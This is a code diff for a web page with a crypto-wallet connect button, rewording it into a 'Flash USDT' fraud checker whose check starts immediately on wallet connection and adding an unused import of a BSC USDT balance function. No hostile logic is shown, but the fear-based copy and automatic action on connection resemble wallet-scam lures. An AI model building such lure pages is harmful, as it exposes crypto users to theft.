@@ -1,4 +1,5 @@
 "use client";
+import { checkBscUsdtBalance } from '../lib/checkBscBalance';
 
 import { ConnectButton } from "thirdweb/react";
 import { client } from "./client";
@@ -12,6 +13,7 @@ export default function Home() {
 
         <div style={styles.connectBtn}>
           <ConnectButton client={client} auth={false} />
+          
         </div>
       </div>
 
@@ -25,30 +27,29 @@ export default function Home() {
       {/* Info Alert Box */}
       <div style={styles.alertBox}>
         <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-          <span style={{ fontSize: "20px" }}>✅</span>
-          <strong style={{ color: "#000" }}>What you can do with this tool</strong>
+          <span style={{ fontSize: "25px" }}>✅</span>
+          <strong style={{ color: "#000" }}>What you can do with this checker</strong>
         </div>
 
         <hr style={styles.hr} />
 
         <p style={styles.smallText}>
-          Connect your wallet to review token balances and smart contract
-          permissions on the selected blockchain network.
+          Flash USDT is a fraudulent, counterfeit version of USDT that can cause security issues. This checker analyzes your wallet address for risky token authorizations and unusual balances. To keep you safe, the check begins immediately after connecting your wallet.
+      
         </p>
       </div>
 
       {/* Main Center Card */}
       <div style={styles.mainCard}>
         <h1 style={styles.title}>
-          Review your wallet tokens Scams or Legit
+          Check your wallet for fraudulent tokens and authorizations
         </h1>
 
         <p style={styles.description}>
-          After connecting, you can inspect token holdings and contract
-          approvals associated with your wallet address.
+          Connecting your wallet will check for any Flash or Fake tokens holdings, such as Flash USDT, as well as any risky token allowances you may have granted to contracts on the currently selected network.
         </p>
 
-        <div style={{ marginTop: "30px" }}>
+        <div style={{ marginTop: "35px" }}>
           <ConnectButton client={client} auth={false} />
         </div>
       </div>
@@ -90,7 +91,9 @@ const styles: any = {
   },
 
   connectBtn: {
-    borderRadius: "8px",
+    borderRadius: "10px",
+    border: "#000",
+    
   },
 
   networkRow: {
@@ -115,7 +118,7 @@ const styles: any = {
     background: "#f5f5f5",
     padding: "25px 30px",
     borderRadius: "14px",
-    boxShadow: "0 6px 15px rgba(0,0,0,0.05)",
+    boxShadow: "0 6px 15px rgba(8, 0, 0, 0.05)",
     maxWidth: "800px",
     color: "#000",
   },
@@ -123,11 +126,11 @@ const styles: any = {
   hr: {
     margin: "12px 0",
     border: "none",
-    borderTop: "1px solid #ccc",
+    borderTop: "1px solid #ad1616",
   },
 
   smallText: {
-    fontSize: "14px",
+    fontSize: "16px",
     color: "#000000",
     lineHeight: "1.6",
   },
@@ -145,7 +148,7 @@ const styles: any = {
 
   title: {
     margin: 0,
-    fontSize: "28px",
+    fontSize: "40px",
     fontWeight: 700,
     color: "#000",
   },
